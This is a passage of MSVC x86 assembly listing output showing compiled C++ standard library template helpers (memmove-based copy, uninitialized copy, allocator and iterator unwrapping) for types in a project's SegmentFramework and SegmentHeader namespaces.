  0000b	8b 7d 0c	 mov	 edi, DWORD PTR __Last$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  0000e	2b f8		 sub	 edi, eax

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00010	57		 push	 edi
  00011	50		 push	 eax
  00012	56		 push	 esi
  00013	e8 00 00 00 00	 call	 _memmove
  00018	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  0001b	c1 ff 03	 sar	 edi, 3
  0001e	8d 04 fe	 lea	 eax, DWORD PTR [esi+edi*8]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00021	5f		 pop	 edi
  00022	5e		 pop	 esi

; 1589 :     }

  00023	5d		 pop	 ebp
  00024	c2 0c 00	 ret	 12			; 0000000cH
??$_Ucopy@PBURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEPAURelocatedNetVar@SegmentFramework@@PBU23@0PAU23@@Z ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Ucopy<SegmentFramework::RelocatedNetVar const *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\type_traits
;	COMDAT ??$forward@ABU?$less@PBD@std@@@std@@YAABU?$less@PBD@0@ABU10@@Z
_TEXT	SEGMENT
??$forward@ABU?$less@PBD@std@@@std@@YAABU?$less@PBD@0@ABU10@@Z PROC ; std::forward<std::less<char const *> const &>, COMDAT
; __Arg$ = ecx

; 1455 :     return static_cast<_Ty&&>(_Arg);

  00000	8b c1		 mov	 eax, ecx

; 1456 : }

  00002	c3		 ret	 0
??$forward@ABU?$less@PBD@std@@@std@@YAABU?$less@PBD@0@ABU10@@Z ENDP ; std::forward<std::less<char const *> const &>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??0?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@QAE@XZ
_TEXT	SEGMENT
??0?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@QAE@XZ PROC ; std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >, COMDAT
; _this$ = ecx

; 772  :     constexpr allocator() noexcept {}

  00000	8b c1		 mov	 eax, ecx
  00002	c3		 ret	 0
??0?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@QAE@XZ ENDP ; std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$_Uninitialized_copy@PBQBDV?$allocator@PBD@std@@@std@@YAPAPBDQBQBD0PAPBDAAV?$allocator@PBD@0@@Z
_TEXT	SEGMENT
__Dest$ = 8						; size = 4
__Al$dead$ = 12						; size = 4
??$_Uninitialized_copy@PBQBDV?$allocator@PBD@std@@@std@@YAPAPBDQBQBD0PAPBDAAV?$allocator@PBD@0@@Z PROC ; std::_Uninitialized_copy<char const * const *,std::allocator<char const *> >, COMDAT
; __First$ = ecx
; __Last$ = edx

; 1517 :     const _InIt _First, const _InIt _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	56		 push	 esi
  00004	8b 75 08	 mov	 esi, DWORD PTR __Dest$[ebp]
  00007	57		 push	 edi
  00008	8b fa		 mov	 edi, edx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  0000a	2b f9		 sub	 edi, ecx

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  0000c	57		 push	 edi
  0000d	51		 push	 ecx
  0000e	56		 push	 esi
  0000f	e8 00 00 00 00	 call	 _memmove
  00014	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00017	c1 ff 02	 sar	 edi, 2
  0001a	8d 04 be	 lea	 eax, DWORD PTR [esi+edi*4]

; 1529 :         (void) _Al;
; 1530 :     } else {
; 1531 :         _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};
; 1532 :         for (; _UFirst != _ULast; ++_UFirst) {
; 1533 :             _Backout._Emplace_back(*_UFirst);
; 1534 :         }
; 1535 : 
; 1536 :         _Dest = _Backout._Release();
; 1537 :     }
; 1538 : 
; 1539 :     return _Dest;

  0001d	5f		 pop	 edi
  0001e	5e		 pop	 esi

; 1540 : }

  0001f	5d		 pop	 ebp
  00020	c3		 ret	 0
??$_Uninitialized_copy@PBQBDV?$allocator@PBD@std@@@std@@YAPAPBDQBQBD0PAPBDAAV?$allocator@PBD@0@@Z ENDP ; std::_Uninitialized_copy<char const * const *,std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??$_Get_unwrapped@ABQBQBD@std@@YAPBQBDABQBQBD@Z
_TEXT	SEGMENT
??$_Get_unwrapped@ABQBQBD@std@@YAPBQBDABQBQBD@Z PROC	; std::_Get_unwrapped<char const * const * const &>, COMDAT
; __It$ = ecx

; 1197 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1198 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1199 :         return _It + 0;

  00000	8b 01		 mov	 eax, DWORD PTR [ecx]

; 1200 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1201 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1202 :     } else {
; 1203 :         return static_cast<_Iter&&>(_It);
; 1204 :     }
; 1205 : }

  00002	c3		 ret	 0
??$_Get_unwrapped@ABQBQBD@std@@YAPBQBDABQBQBD@Z ENDP	; std::_Get_unwrapped<char const * const * const &>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xstddef
;	COMDAT ??$_Unfancy@URelocatedNetVar@SegmentFramework@@@std@@YAPAURelocatedNetVar@SegmentFramework@@PAU12@@Z
_TEXT	SEGMENT
??$_Unfancy@URelocatedNetVar@SegmentFramework@@@std@@YAPAURelocatedNetVar@SegmentFramework@@PAU12@@Z PROC ; std::_Unfancy<SegmentFramework::RelocatedNetVar>, COMDAT
; __Ptr$ = ecx

; 289  :     return _Ptr;

  00000	8b c1		 mov	 eax, ecx

; 290  : }

  00002	c3		 ret	 0
??$_Unfancy@URelocatedNetVar@SegmentFramework@@@std@@YAPAURelocatedNetVar@SegmentFramework@@PAU12@@Z ENDP ; std::_Unfancy<SegmentFramework::RelocatedNetVar>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??$_Copy_memmove@PAURelocatedNetVar@SegmentFramework@@PAU12@@std@@YAPAURelocatedNetVar@SegmentFramework@@PAU12@00@Z
_TEXT	SEGMENT
__Dest$ = 8						; size = 4
??$_Copy_memmove@PAURelocatedNetVar@SegmentFramework@@PAU12@@std@@YAPAURelocatedNetVar@SegmentFramework@@PAU12@00@Z PROC ; std::_Copy_memmove<SegmentFramework::RelocatedNetVar *,SegmentFramework::RelocatedNetVar *>, COMDAT
; __First$ = ecx
; __Last$ = edx

; 3749 : _OutIt _Copy_memmove(_InIt _First, _InIt _Last, _OutIt _Dest) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	56		 push	 esi

; 3750 :     const char* const _First_ch = const_cast<const char*>(reinterpret_cast<const volatile char*>(_First));
; 3751 :     const char* const _Last_ch  = const_cast<const char*>(reinterpret_cast<const volatile char*>(_Last));
; 3752 :     char* const _Dest_ch        = const_cast<char*>(reinterpret_cast<volatile char*>(_Dest));
; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);
; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00004	8b 75 08	 mov	 esi, DWORD PTR __Dest$[ebp]
  00007	57		 push	 edi
  00008	8b fa		 mov	 edi, edx
  0000a	2b f9		 sub	 edi, ecx
  0000c	57		 push	 edi
  0000d	51		 push	 ecx
  0000e	56		 push	 esi
  0000f	e8 00 00 00 00	 call	 _memmove
  00014	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3755 :     return reinterpret_cast<_OutIt>(_Dest_ch + _Count);

  00017	8d 04 37	 lea	 eax, DWORD PTR [edi+esi]
  0001a	5f		 pop	 edi
  0001b	5e		 pop	 esi

; 3756 : }

  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??$_Copy_memmove@PAURelocatedNetVar@SegmentFramework@@PAU12@@std@@YAPAURelocatedNetVar@SegmentFramework@@PAU12@00@Z ENDP ; std::_Copy_memmove<SegmentFramework::RelocatedNetVar *,SegmentFramework::RelocatedNetVar *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$_Uninitialized_copy@PBURelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAPAURelocatedNetVar@SegmentFramework@@QBU12@0PAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z
_TEXT	SEGMENT
__Dest$ = 8						; size = 4
__Al$dead$ = 12						; size = 4
??$_Uninitialized_copy@PBURelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAPAURelocatedNetVar@SegmentFramework@@QBU12@0PAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z PROC ; std::_Uninitialized_copy<SegmentFramework::RelocatedNetVar const *,std::allocator<SegmentFramework::RelocatedNetVar> >, COMDAT
; __First$ = ecx
; __Last$ = edx

; 1517 :     const _InIt _First, const _InIt _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	56		 push	 esi
  00004	8b 75 08	 mov	 esi, DWORD PTR __Dest$[ebp]
  00007	57		 push	 edi
  00008	8b fa		 mov	 edi, edx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  0000a	2b f9		 sub	 edi, ecx

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  0000c	57		 push	 edi
  0000d	51		 push	 ecx
  0000e	56		 push	 esi
  0000f	e8 00 00 00 00	 call	 _memmove
  00014	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00017	c1 ff 03	 sar	 edi, 3
  0001a	8d 04 fe	 lea	 eax, DWORD PTR [esi+edi*8]

; 1529 :         (void) _Al;
; 1530 :     } else {
; 1531 :         _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};
; 1532 :         for (; _UFirst != _ULast; ++_UFirst) {
; 1533 :             _Backout._Emplace_back(*_UFirst);
; 1534 :         }
; 1535 : 
; 1536 :         _Dest = _Backout._Release();
; 1537 :     }
; 1538 : 
; 1539 :     return _Dest;

  0001d	5f		 pop	 edi
  0001e	5e		 pop	 esi

; 1540 : }

  0001f	5d		 pop	 ebp
  00020	c3		 ret	 0
??$_Uninitialized_copy@PBURelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAPAURelocatedNetVar@SegmentFramework@@QBU12@0PAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z ENDP ; std::_Uninitialized_copy<SegmentFramework::RelocatedNetVar const *,std::allocator<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??$_Get_unwrapped@ABQBURelocatedNetVar@SegmentFramework@@@std@@YAPBURelocatedNetVar@SegmentFramework@@ABQBU12@@Z
_TEXT	SEGMENT
??$_Get_unwrapped@ABQBURelocatedNetVar@SegmentFramework@@@std@@YAPBURelocatedNetVar@SegmentFramework@@ABQBU12@@Z PROC ; std::_Get_unwrapped<SegmentFramework::RelocatedNetVar const * const &>, COMDAT
; __It$ = ecx

; 1197 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1198 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1199 :         return _It + 0;

  00000	8b 01		 mov	 eax, DWORD PTR [ecx]

; 1200 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1201 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1202 :     } else {
; 1203 :         return static_cast<_Iter&&>(_It);
; 1204 :     }
; 1205 : }

  00002	c3		 ret	 0
??$_Get_unwrapped@ABQBURelocatedNetVar@SegmentFramework@@@std@@YAPBURelocatedNetVar@SegmentFramework@@ABQBU12@@Z ENDP ; std::_Get_unwrapped<SegmentFramework::RelocatedNetVar const * const &>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??$_Copy_memmove@PBQBDPAPBD@std@@YAPAPBDPBQBD0PAPBD@Z
_TEXT	SEGMENT
__Dest$ = 8						; size = 4
??$_Copy_memmove@PBQBDPAPBD@std@@YAPAPBDPBQBD0PAPBD@Z PROC ; std::_Copy_memmove<char const * const *,char const * *>, COMDAT
; __First$ = ecx
; __Last$ = edx

; 3749 : _OutIt _Copy_memmove(_InIt _First, _InIt _Last, _OutIt _Dest) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	56		 push	 esi

; 3750 :     const char* const _First_ch = const_cast<const char*>(reinterpret_cast<const volatile char*>(_First));
; 3751 :     const char* const _Last_ch  = const_cast<const char*>(reinterpret_cast<const volatile char*>(_Last));
; 3752 :     char* const _Dest_ch        = const_cast<char*>(reinterpret_cast<volatile char*>(_Dest));
; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);
; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00004	8b 75 08	 mov	 esi, DWORD PTR __Dest$[ebp]
  00007	57		 push	 edi
  00008	8b fa		 mov	 edi, edx
  0000a	2b f9		 sub	 edi, ecx
  0000c	57		 push	 edi
  0000d	51		 push	 ecx
  0000e	56		 push	 esi
  0000f	e8 00 00 00 00	 call	 _memmove
  00014	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3755 :     return reinterpret_cast<_OutIt>(_Dest_ch + _Count);

  00017	8d 04 37	 lea	 eax, DWORD PTR [edi+esi]
  0001a	5f		 pop	 edi
  0001b	5e		 pop	 esi

; 3756 : }

  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??$_Copy_memmove@PBQBDPAPBD@std@@YAPAPBDPBQBD0PAPBD@Z ENDP ; std::_Copy_memmove<char const * const *,char const * *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??$_Copy_memmove@PBURelocatedNetVar@SegmentFramework@@PAU12@@std@@YAPAURelocatedNetVar@SegmentFramework@@PBU12@0PAU12@@Z
_TEXT	SEGMENT
__Dest$ = 8						; size = 4
??$_Copy_memmove@PBURelocatedNetVar@SegmentFramework@@PAU12@@std@@YAPAURelocatedNetVar@SegmentFramework@@PBU12@0PAU12@@Z PROC ; std::_Copy_memmove<SegmentFramework::RelocatedNetVar const *,SegmentFramework::RelocatedNetVar *>, COMDAT
; __First$ = ecx
; __Last$ = edx

; 3749 : _OutIt _Copy_memmove(_InIt _First, _InIt _Last, _OutIt _Dest) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	56		 push	 esi

; 3750 :     const char* const _First_ch = const_cast<const char*>(reinterpret_cast<const volatile char*>(_First));
; 3751 :     const char* const _Last_ch  = const_cast<const char*>(reinterpret_cast<const volatile char*>(_Last));
; 3752 :     char* const _Dest_ch        = const_cast<char*>(reinterpret_cast<volatile char*>(_Dest));
; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);
; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00004	8b 75 08	 mov	 esi, DWORD PTR __Dest$[ebp]
  00007	57		 push	 edi
  00008	8b fa		 mov	 edi, edx
  0000a	2b f9		 sub	 edi, ecx
  0000c	57		 push	 edi
  0000d	51		 push	 ecx
  0000e	56		 push	 esi
  0000f	e8 00 00 00 00	 call	 _memmove
  00014	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3755 :     return reinterpret_cast<_OutIt>(_Dest_ch + _Count);

  00017	8d 04 37	 lea	 eax, DWORD PTR [edi+esi]
  0001a	5f		 pop	 edi
  0001b	5e		 pop	 esi

; 3756 : }

  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??$_Copy_memmove@PBURelocatedNetVar@SegmentFramework@@PAU12@@std@@YAPAURelocatedNetVar@SegmentFramework@@PBU12@0PAU12@@Z ENDP ; std::_Copy_memmove<SegmentFramework::RelocatedNetVar const *,SegmentFramework::RelocatedNetVar *>
_TEXT	ENDS
END
